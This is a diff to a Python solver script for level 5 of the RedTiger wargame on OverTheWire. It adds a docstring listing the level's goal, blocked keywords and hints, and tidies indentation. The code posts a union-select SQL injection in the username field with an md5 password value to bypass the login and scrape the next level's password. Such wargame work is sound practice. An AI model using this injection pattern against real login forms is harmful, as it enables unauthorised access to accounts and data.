@@ -4,9 +4,13 @@ import tigers as tg
 
 
 def main():
-
+    '''
+    Target: Bypass the login
+    Disabled: substring , substr, ( , ), mid
+    Hints: its not a blind, the password is md5-crypted, watch the login errors
+    '''
     url = "https://redtiger.labs.overthewire.org/level5.php"
-    finds = 'md5(1)' 
+    finds = 'md5(1)'
     url_param = '?mode=login'
     pass_r = 'The password for the next level is: '
 
@@ -40,7 +44,7 @@ def main():
         username="' union select %s #", password=1, login='Login')
 
     response = tg.try_auth(url, list_of_columns, data,
-                url_param, finds, cook)
+                           url_param, finds, cook)
 
     # Еxtracting data from html
     passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
